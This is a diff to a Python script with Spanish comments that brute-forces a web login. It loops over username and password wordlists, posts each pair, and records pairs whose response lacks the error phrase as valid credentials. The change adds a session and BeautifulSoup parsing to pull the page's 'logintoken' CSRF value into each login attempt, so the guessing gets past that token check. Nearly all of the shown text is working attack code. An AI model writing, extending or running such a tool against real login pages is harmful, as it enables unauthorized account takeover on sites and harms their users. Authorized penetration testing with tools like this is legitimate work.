@@ -6,6 +6,7 @@ import sys
 import time
 import requests
 import urllib3
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings()  # Desactiva el mensaje de conexión insegura
 
@@ -41,15 +42,24 @@ def error():
         sys.stdout.flush()
         time.sleep(0.02)
 
-#  CONNECTAMOS CON EL SERVIDOR MEDIANTE UNA PETICIÓN POST
+#  CONNECTAMOS CON EL SERVIDOR
 
 def connect(line1, line2):
-    credentials = {
-        "username": line1[:-1],
-        "password": line2[:-1]
+    client = requests.Session() # se crea una sesión para el cliente
+
+    html = client.get(url).content # obtenemos el contenido de la url a través de una solicitud get
+    soup = BeautifulSoup(html, 'html.parser') # creamos un objeto soup para analizar el html
+
+    crsf = soup.find('input' , {'name':'logintoken'}).get('value') # en el analisis intentamos obtener el id del token de cada sesión
+
+    login_information = { # nos quedamos con las credenciales para probar de logearnos
+        'logintoken' : crsf,
+        'username' : line1[:-1],
+        'password' : line2[:-1]
     }
 
-    req = requests.post(url, verify=False, data=credentials)
+    response = client.post(url, data=login_information).content # realizamos una petición post y nos quedamos con el contenido
+    req = response.decode('utf-8') # pasamos el contenido a utf-8 para los carácteres especiales
 
     return req
 
@@ -77,16 +87,15 @@ def main():
             for line1 in file:
                 for line2 in file2:
                     req = browser(line1, line2)
-                    if req.text.find(frase_error) == -1:
+                    if frase_error not in req:
                         print("\x1b[1;32m" + "[x] Credenciales válidas: usuario: {} - password: {}".format(line1[:-1],line2[:-1]))
                         valids.write("Usuario: {} Password: {}".format(line1[:-1],line2[:-1]) + "\n")
                         bucle = False
                         break
-                    else:
+                    elif frase_error in req:
                         print("\x1b[0;31m" + "[x] Buscando credenciales... {} - {} Inválidos".format(line1[:-1],line2[:-1]))
                 file2.seek(0)
             file.seek(0)
-
 
 if __name__ == "__main__":
     main()
